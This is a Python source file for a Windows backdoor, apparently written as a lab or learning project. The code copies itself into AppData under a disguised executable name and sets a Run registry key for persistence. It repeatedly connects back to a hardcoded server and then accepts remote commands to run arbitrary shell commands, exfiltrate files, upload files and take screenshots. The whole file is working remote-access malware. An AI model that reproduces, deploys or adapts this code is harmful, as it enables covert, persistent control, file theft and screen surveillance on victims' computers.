import ctypes
import socket
import subprocess
import os
import time
import sys
import shutil
from PIL import ImageGrab
import tempfile


def initiate():
    registry()
    tuneConnection()

def registry():
    location = os.environ['appdata']+'\\windows32.exe'
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+ location + '"', shell=True)

def transfer(s, path):
    if os.path.exists(path):
        f=open(path, 'rb')
        packet = f.read(1024)
        while len(packet) >0:
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def tuneConnection():
    # Tries to connect to server every 10 seconds
    while True:
        s = socket.socket()
        time.sleep(10)
        try:
            s.connect(("192.168.80.132", 8080))  #10.0.0.251,10.3.131.241
            conn(s)
        except:
            tuneConnection()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def letGrab(s, path):
    try:
        if os.path.exists(path):
            #f = open(path, 'rb')
            with open(path, 'rb') as f:
            # packet = f.read(1024)
            # while len(packet) > 0:
            #     s.send(packet)
            #     packet = f.read(1024)
            # s.send(b'DONE')
                while packet :=f.read(1024):
                    s.send(packet)
                s.send(b'DONE')
        else:
            s.send(b'File not found')
    except Exception as e:
        s.send(f"[-] Error in file transfer: {str(e)}".encode())

def letSend(s, path, fileName):
    try:
        os.makedirs(path, exist_ok=True)
        fullPath = os.path.join(path, fileName)
        with open(fullPath, 'ab') as f:
            while True:
                bits = s.recv(1024)
                if bits.endswith(b'DONE'):
                    # Write those last received bits without the word 'Done' - 4 characters
                    f.write(bits[:-4])
                    f.close()
                    break
                if (b'File not found' in bits or b'File is empty') in bits:
                    print(f"[-] server could not send file")
                    break
                f.write(bits)
        print(f"[+]File Received and saved as: {fullPath}")
    except Exception as e:
        print(f"[-] Error receiving file: {str(e)}")

def conn(s):  #(Connect, Connection, Connecting, shell)
    try:
        #registry()  #Call Registry Function
        # s = socket.socket()
        # s.connect(("192.168.80.132", 8080))
        # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            cmd = s.recv(1024).decode()

            if 'terminate' in cmd:
                s.close()
                break

            elif 'checkPriv' in cmd:
                s.send(("[+] Administrator Privileges." if is_admin() else "[!!] User Privileges. (No Admin privileges)").encode())

            # command format: grab*<filepath>
            # Example: grab*C:\Users\John\Desktop\photo.jpg
            elif cmd.startswith('grab'):
                parts = cmd.split("*")
                if len(parts) < 2:
                    s.send(b"[-] Invalid grab command format")
                    continue
                cmd, path = parts
                letGrab(s, path)

            # command format: send*<Destination path>*<filepath>
            # Example: send*C:\Users\John\Desktop\*photo.jpg
            elif cmd.startswith('send'):
                send, path, FileName = cmd.split('*')
                try:
                    letSend(s, path, FileName)
                except Exception as e:
                    s.send("[-] Error occurred when sending file: " + str(e).encode())

            # command format: "cd<space><Path name>"
            # split using the space between 'cd' and path name
            # (because, path name may also have spaces, that confuses the script)
            # and explicitly tell the operating system to change the directory
            elif 'cd' in cmd:
                try:
                    code, directory = cmd.split(" ", 1)
                    os.chdir(directory)
                    inform_to_server = "[+] Current working directory is " + os.getcwd()
                    s.send(inform_to_server.encode())
                except Exception as e:
                    s.send(f"[+] Some error occurred when changing directory: {str(e)}".encode())

            elif 'screencap' in cmd:
                # Create a temp dir to store our screenshot file
                # Sample Dirpath: C:\users\user\appdata\local\temp\tmp8dfj57ox
                dirpath = tempfile.mkdtemp()
                #grab() method takes a screenshot of the screen
                #save() method saves the snapshot in the temp dir
                ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
                transfer(s, dirpath + "\img.jpg")  #transfer to the server using our transfer function
                shutil.rmtree(dirpath)   #delete the temp directory using shutil remove tree


            else:
                CMD = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                # send back the result
                s.send(CMD.stdout.read())

                # send back the error -if any-, such as syntax error
                s.send(CMD.stderr.read())

    except Exception as e:
        s.send(f"[+] Some big error occurred: {str(e)}".encode())

def main():
    initiate()

if __name__ == '__main__':
    main()

